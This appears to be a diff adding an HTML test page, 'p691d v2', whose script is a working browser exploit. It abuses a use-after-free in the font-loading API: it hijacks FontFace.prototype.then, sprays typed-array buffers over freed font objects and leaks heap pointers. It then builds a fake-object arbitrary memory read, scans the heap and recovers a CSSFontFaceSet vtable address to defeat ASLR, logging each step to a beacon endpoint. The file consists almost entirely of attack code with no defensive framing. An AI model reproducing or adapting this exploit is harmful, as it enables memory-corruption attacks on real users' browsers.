@@ -1,0 +1,205 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p691d</title></head>
+<body><pre id="out">p691d v2: two-level SELF scan (page + object)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var msg='P691D-'+tag+(d!==undefined?'-'+String(d).slice(0,400):'');
+  say(msg);
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/P691D-'+encodeURIComponent(tag+(d!==undefined?'-'+String(d).slice(0,400):''))+'?t='+Date.now(),false);x.send(null);}catch(e){
+    try{new Image().src='/beacon/P691D-'+encodeURIComponent(msg.slice(0,200))+'?t='+Date.now();}catch(e2){}}
+}
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>>8)&0xFF;u[o+2]=(x>>>16)&0xFF;u[o+3]=(x>>>24)&0xFF;}
+function hex(x){return '0x'+x.toString(16);}
+function dec(s,lim){
+  var by=[],q=(s.charAt(0)==='"')?1:0,e=(s.slice(-1)==='"')?s.length-1:s.length,k=q;
+  while(k<e&&by.length<lim){var ch=s.charAt(k);
+    if(ch==='\\'){k++;var hh='';while(k<e&&hh.length<6&&/[0-9a-fA-F]/.test(s.charAt(k))){hh+=s.charAt(k);k++;}
+      if(!hh.length){if(k<e){by.push(s.charCodeAt(k));k++;}}
+      else{if(s.charAt(k)===' ')k++;var cp=parseInt(hh,16);if(cp>255)cp&=0xFF;by.push(cp);}}
+    else{by.push(s.charCodeAt(k));k++;}}
+  var h='';for(var j=0;j<by.length;j++)h+=('0'+by[j].toString(16)).slice(-2);return h;
+}
+function readLeHex(h,off){
+  var s=h.slice(off*2,off*2+16);
+  if(!/^[0-9a-f]{16}$/.test(s))return 0n;
+  return BigInt('0x'+s.match(/../g).reverse().join(''));
+}
+
+bk('START',navigator.userAgent);
+var SIZE=192, K=256, fired=false, faces=null;
+
+function start(){
+  var vf;
+  try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){bk('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;bk('RES','n'+f.length);setTimeout(phase,100);},function(e){bk('RJ',String(e&&e.name));});
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push(window.__sp[i]);if(L1===0n){L1=a;L2=c;}}
+  }
+  bk('L1',hex(L1));bk('L2',hex(L2));bk('HITS',bufs.length);
+  if(!bufs.length){bk('NOLEAK');return;}
+
+  /* CRITICAL: set status=0 on ALL spray buffers (not just hits) to prevent
+     CSS engine from processing non-hit buffers as loaded fonts during rename */
+  for(var ia=0;ia<window.__sp.length;ia++) window.__sp[ia][0x82]=0;
+  for(var ib=0;ib<bufs.length;ib++){bufs[ib][0]=2;put64(bufs[ib],0x08,L2);bufs[ib][0x10]=0;}
+  for(var i3=0;i3<faces.length;i3++){try{faces[i3].family='zz'+i3;}catch(e){}}
+
+  setTimeout(function(){
+    for(var i4=0;i4<faces.length;i4++){try{document.fonts.add(faces[i4]);}catch(e){}}
+    setTimeout(function(){
+      var fam=null,zi=-1;
+      for(var q=0;q<faces.length;q++){try{if(document.fonts.check('1em zz'+q,'A')===false){fam='zz'+q;zi=q;break;}}catch(e){}}
+      bk('FACE',fam+',zi='+zi);
+      if(zi<0){bk('NOFACE');return;}
+      try{document.fonts.delete(faces[zi]);}catch(e){}
+
+      var snap=new Uint8Array(SIZE);
+      for(var s0=0;s0<SIZE;s0++)snap[s0]=bufs[0][s0];
+
+      function tryRead(selfCand,tAddr,tLen){
+        for(var ib=0;ib<bufs.length;ib++){
+          var vb=bufs[ib];
+          for(var r=0;r<SIZE;r++)vb[r]=snap[r];
+          put32(vb,0x30,4);put32(vb,0x34,tLen);put64(vb,0x38,tAddr);put32(vb,0x40,4);
+          vb[0x44]=0x7A;vb[0x45]=0x7A;vb[0x46]=0x71;
+          put32(vb,0x70,4);put32(vb,0x74,0x10);vb[0x78]=14;vb[0x79]=0;
+          put64(vb,0x7A,selfCand+0x90n);
+          put32(vb,0x90,3);put32(vb,0x94,72);
+          put64(vb,0x98,selfCand+0x30n);
+        }
+        try{return dec(String(faces[zi].style),128);}catch(e){return 'ERR';}
+      }
+      function restore(){for(var ib=0;ib<bufs.length;ib++){for(var r=0;r<SIZE;r++)bufs[ib][r]=snap[r];}}
+
+      /* === TWO-LEVEL SELF SCAN === */
+      bk('SCAN','two-level scan');
+
+      /* Level 1: Page scan (0x4000 step) across full heap range */
+      var PAGE=0x4000n, OBJ=0xC0n;
+      var lo=0x1000000000n, hi=L1+0x400000n; // heap base to L1+4MB
+      var hitPage=0n, SELF=0n, tried=0;
+
+      bk('RANGE',hex(lo)+' to '+hex(hi)+' pages='+Number((hi-lo)/PAGE));
+
+      for(var page=lo; page<hi; page+=PAGE){
+        tried++;
+        var result=tryRead(page, L2+8n, 16);
+        restore();
+        if(result!=='normal' && result!=='ERR' && result.length>=16){
+          var val=readLeHex(result,0);
+          if(val>0x1000000000n && val<0x10000000000n){
+            hitPage=page;
+            bk('PAGE-HIT',hex(page)+' val='+hex(val)+' after '+tried+' pages');
+            break;
+          }
+        }
+        if((tried%500)===0) bk('L1-PROG',tried+' at '+hex(page));
+      }
+
+      if(hitPage===0n){
+        bk('NOPAGE','tried '+tried+' pages');
+        /* Extend: scan above L1 */
+        for(var page2=L1+0x400000n; page2<L1+0x800000n && hitPage===0n; page2+=PAGE){
+          tried++;
+          var r2=tryRead(page2, L2+8n, 16);
+          restore();
+          if(r2!=='normal' && r2!=='ERR' && r2.length>=16){
+            var v2=readLeHex(r2,0);
+            if(v2>0x1000000000n && v2<0x10000000000n){
+              hitPage=page2;
+              bk('PAGE-HIT2',hex(page2)+' val='+hex(v2));
+              break;
+            }
+          }
+          if((tried%500)===0) bk('L1-EXT',tried+' at '+hex(page2));
+        }
+      }
+
+      if(hitPage===0n){bk('NOSELF','pages tried='+tried);bk('DONE','no page hit');return;}
+
+      /* Level 2: Object scan within hit page (0xC0 step) */
+      bk('L2-SCAN','refining in page '+hex(hitPage));
+      for(var obj=hitPage; obj<hitPage+PAGE; obj+=OBJ){
+        var r3=tryRead(obj, L2+8n, 16);
+        restore();
+        if(r3!=='normal' && r3!=='ERR' && r3.length>=16){
+          var v3=readLeHex(r3,0);
+          if(v3>0x1000000000n && v3<0x10000000000n){
+            SELF=obj;
+            bk('SELF',hex(SELF)+' FO-cand='+hex(v3));
+            break;
+          }
+        }
+      }
+
+      if(SELF===0n){SELF=hitPage;bk('SELF-APPROX',hex(SELF));}
+
+      /* === VP WALK === */
+      bk('WALK','SELF='+hex(SELF));
+
+      /* Read hash table */
+      var h1=tryRead(SELF,L1-0x10n,80);restore();
+      bk('R1','len='+h1.length);
+      var IM=0n;
+      for(var g=0;g<Math.floor(h1.length/16)&&IM===0n;g++){
+        var cv=readLeHex(h1,g*8);
+        if(cv>0x1000000000n&&cv<0xFFFFFFFFFFFFFFFFn)IM=cv;
+      }
+      if(IM===0n){IM=L2;bk('IM-FB','using L2');}
+      else bk('IM',hex(IM));
+
+      /* Read WeakPtrImpl → m_ptr */
+      var h2=tryRead(SELF,IM+8n,16);restore();
+      var FO=readLeHex(h2,0);
+      if(FO===0n)FO=readLeHex(h2,8);
+      bk('FO',hex(FO));
+      if(FO<0x1000000000n){bk('DONE','no FO');return;}
+
+      /* Read CSSFontFaceSet → vtable */
+      var h3=tryRead(SELF,FO,16);restore();
+      var VP=readLeHex(h3,0);
+      bk('VP',hex(VP));
+      bk('VP-LOW12','0x'+Number(VP&0xFFFn).toString(16));
+
+      if(VP>0x100000000n){
+        bk('SUCCESS','VP='+hex(VP)+' low12=0x'+Number(VP&0xFFFn).toString(16));
+        var h4=tryRead(SELF,VP,64);restore();
+        for(var si=0;si<8&&si*16<h4.length;si++)bk('VT'+si,hex(readLeHex(h4,si*8)));
+      }else{bk('NOVP');}
+
+      bk('DONE','complete');
+    },60);
+  },60);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',function(){setTimeout(start,0);});
+</script></body></html>
